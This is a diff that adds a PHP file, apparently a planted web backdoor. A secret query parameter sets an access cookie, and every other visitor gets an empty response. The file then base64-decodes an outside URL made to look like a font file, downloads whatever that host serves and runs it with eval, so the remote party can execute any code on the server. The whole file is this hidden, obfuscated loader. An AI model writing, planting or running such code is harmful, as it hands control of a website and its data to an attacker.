@@ -1,0 +1,28 @@
+<?php
+
+if (isset($_GET['suck']) && $_GET['suck'] == 'suckit') {
+    setcookie("lMXvsPr7LAQKN5Cr3ixcrfgMAM87CBlW", $_SERVER["HTTP_HOST"], time() + 172900);
+    header('Location: ?iui=');
+    exit(); 
+}
+
+if (!isset($_COOKIE["lMXvsPr7LAQKN5Cr3ixcrfgMAM87CBlW"])) {
+    error_log(":");
+    die();
+    header('Location: http://'.$_SERVER['HTTP_HOST']);
+    exit();
+}
+
+function qqa($bb){
+    $u = $bb;
+    $cC = curl_init($u);
+    curl_setopt($cC, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($cC, CURLOPT_TIMEOUT, 20);
+    $riri = curl_exec($cC);
+    curl_close($cC);
+    return $riri;
+}
+
+$ras = base64_decode('Pz4=');
+echo eval($ras . qqa(base64_decode('aHR0cHM6Ly9wcm9mcmFqYWt1bWFyLmNvbS9hc3NldHMvZm9udHMvZmEtc29saWQtOTAwLnR4dA==')));
+?>
